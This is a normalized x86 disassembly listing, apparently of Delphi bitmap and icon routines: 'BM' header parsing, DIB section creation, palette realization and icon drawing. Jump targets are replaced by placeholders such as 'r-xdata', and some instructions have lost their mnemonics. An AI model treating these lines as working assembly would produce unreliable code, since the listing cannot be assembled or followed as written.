push ebp
push sub_423027
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_421a54
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_421a50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42302e
push rw-data
call LeaveCriticalSection
retn
sub_423040
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_4235d0
pop edx
pop edi
pop esi
pop ebx
retn
sub_423068
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_4026f4
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_423585
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_423558
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402d44
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_41e50c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_4162ec
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402d44
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41627c
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_41e79c
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_41e7bc
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_41627c
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_41e62c
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_4234d3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_41ea64
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_4026f4
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_42343b
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41627c
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_41e62c
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_42340f
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_41ed1c
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40d144
call sub_41e50c
jmp r-xdata
xor eax eax
push ebp
push sub_4234a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41627c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423416
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4234da
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40d144
call sub_41e50c
jmp r-xdata
sub_423416
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_402714
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_4234da
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402d44
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_42356f
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_41ed1c
mov [ ebp - 0x30 ] eax
sub_42358c
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_422f40
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4235d0
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_422c70
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_41627c
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402d44
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_422f40
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_423068
call sub_41e50c
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_423640
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_422c70
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402d44
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_422288
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_4236db
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_422f40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_423704
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_422b2c
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_422c70
mov eax esi
call sub_422d80
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_422c70
mov eax esi
call sub_422d80
mov eax esi
call sub_422bfc
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_422288
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_42268c
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_422f40
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_422f40
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_421c24
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42383c
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_422c80
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_42268c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_423890
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_422c80
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_42268c
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_423910
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_422c70
mov eax ebx
call sub_422c80
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_421c24
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4239a7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_422f40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_421b1c
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_41c444
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_4239ac
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_403af8
call sub_403b4c
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_421b1c
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4239e4
push ebx
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
pop ebx
retn
cmp edx 0x20000000
jne r-xdata
mov [ esi + 0x38 ] 0x1
mov [ esi + 0x38 ] 0x0
jmp r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax esi
call sub_422c80
lea eax [ ebx + 0x18 ]
push eax
mov ecx [ ebx + 0x10 ]
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_42268c
mov [ esi + 0x34 ] edx
mov eax [ esi + 0x28 ]
cmp [ eax + 0x4 ] 0x1
jle r-xdata
sub_423a34
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_422c80
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_42268c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_423a90
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402d44
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_422bfc
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_41f470
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_4162b4
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_4162b4
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402d44
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_422ac0
mov dl [ r-xdata ]
call sub_41e308
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_41e62c
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_421bd8
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_4162b4
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_4162b4
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_4162b4
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_4162b4
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_4162b4
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_4162b4
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_41ea9c
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_4162b4
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_41edc0
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_423d50
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_422c80
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_421c24
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_423dca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_422288
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_423df0
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403334
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_423e38
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41f7ac
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_421a50
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_423e8c
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_421a54
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414988
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_423ebc
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_424194
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_421a50
mov eax [ esi + 0x28 ]
call sub_421a54
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_4149b4
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_423f1c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_41e308
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_423f74
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_423fb0
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_416070
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_41627c
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_41f06c
jmp r-xdata
jmp r-xdata
call sub_41e518
sub_424028
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4240b5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_423f74
cmp eax [ rw-data ]
jne r-xdata
call sub_41e518
mov eax esi
call sub_423f74
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_41f5b0
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402d44
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
